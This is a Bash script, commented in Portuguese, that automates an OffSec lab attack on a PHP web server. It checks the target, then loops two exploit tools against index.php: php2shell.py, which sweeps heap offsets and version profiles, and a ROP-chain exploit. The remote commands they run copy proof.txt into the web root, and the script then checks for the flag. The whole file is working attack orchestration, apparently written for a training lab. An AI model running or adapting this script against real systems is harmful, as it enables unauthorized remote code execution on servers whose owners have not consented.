#!/bin/bash
# run_all.sh — tenta todas as abordagens para resolver o lab OffSec
# 1. php2shell.py (pDestructor, perfil 8.5.11 com sweep htdata)
# 2. exploit-orig.py (ROP chain, auto-heap bucket)
#
# Uso:
#   ./run_all.sh               → OffSec lab ($IP)
#   ./run_all.sh <host> [port] → host/porta específicos

set -u

HOST="${1:-${IP:-192.168.170.10}}"
PORT="${2:-80}"
BASE="http://$HOST:$PORT"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'

check_flag() {
    local CHECK
    CHECK=$(curl -s --max-time 5 "$BASE/proof.txt" 2>/dev/null)
    if [ -n "$CHECK" ] && ! echo "$CHECK" | grep -qiE "404|Not Found|Forbidden"; then
        echo ""
        echo -e "${GREEN}═══════════════════════════════════════════════${NC}"
        echo -e "${GREEN}  FLAG ENCONTRADA!${NC}"
        echo -e "${GREEN}═══════════════════════════════════════════════${NC}"
        echo "$CHECK"
        return 0
    fi
    return 1
}

echo -e "${CYAN}═══════════════════════════════════════════════${NC}"
echo -e "${CYAN}  OffSec Lab — CVE-2026-109618 — All Methods${NC}"
echo -e "${CYAN}═══════════════════════════════════════════════${NC}"
echo ""

# Pre-check
echo -e "${YELLOW}[*]${NC} Testando $HOST:$PORT..."
if ! curl -s --max-time 5 -o /dev/null "$BASE/"; then
    echo -e "${RED}[FAIL]${NC} Target inacessível"
    exit 1
fi
HEADERS=$(curl -sI --max-time 5 "$BASE/index.php" 2>/dev/null)
echo "  $(echo "$HEADERS" | grep -i '^Server:' | tr -d '\r')"
echo "  $(echo "$HEADERS" | grep -i '^X-Powered-By:' | tr -d '\r')"
echo ""

check_flag && exit 0

# ============================================================
# PHASE 1: php2shell.py com perfil 8.5.11
# ============================================================
echo -e "${CYAN}── PHASE 1: php2shell.py (pDestructor) ──${NC}"
echo ""

HTDATA_OFFSETS=("0x690D8" "0x6E0D8" "0x6B0D8" "0x700D8" "0x660D8")

for HTDATA in "${HTDATA_OFFSETS[@]}"; do
    for ATTEMPT in 1 2 3; do
        echo -e "${YELLOW}[php2shell]${NC} htdata=$HTDATA attempt=$ATTEMPT"

        python3 php2shell.py exploit \
          -u "$BASE/index.php" \
          --allow-remote \
          --profile profiles/php-8.5.11-noble-amd64.json \
          --htdata-offset "$HTDATA" \
          --cmd 'cp ../p* .' \
          --retries 1 \
          --force \
          --no-probe \
          --timeout 30 2>&1

        sleep 1
        check_flag && exit 0
    done
done

echo ""
echo -e "${YELLOW}[*]${NC} Phase 1 falhou. Tentando com perfil 8.4.26..."
echo ""

for HTDATA in "${HTDATA_OFFSETS[@]}"; do
    echo -e "${YELLOW}[php2shell]${NC} profile=offsec-lab htdata=$HTDATA"

    python3 php2shell.py exploit \
      -u "$BASE/index.php" \
      --allow-remote \
      --profile php-offsec-lab \
      --htdata-offset "$HTDATA" \
      --cmd 'cp ../p* .' \
      --retries 1 \
      --force \
      --no-probe \
      --timeout 30 2>&1

    sleep 1
    check_flag && exit 0
done

# ============================================================
# PHASE 2: exploit-orig.py (ROP chain, auto-heap)
# ============================================================
echo ""
echo -e "${CYAN}── PHASE 2: exploit-orig.py (ROP chain) ──${NC}"
echo ""

for ATTEMPT in $(seq 1 10); do
    echo -e "${YELLOW}[exploit-orig]${NC} attempt=$ATTEMPT"

    python3 exploit-orig.py \
      --host "$HOST" \
      --port "$PORT" \
      --rce 'cp /var/www/proof.txt /var/www/html/'

    sleep 1
    check_flag && exit 0
    sleep 1
done

echo ""
echo -e "${RED}[-] Todas as abordagens falharam.${NC}"
echo "Dicas:"
echo "  1. Verifique: curl $BASE/proof.txt"
echo "  2. Pode ser necessário reiniciar o lab (a máquina) e tentar de novo"
echo "  3. Se Stage 1 sempre falha: memory_limit pode ser 128M (não 8M)"
exit 1
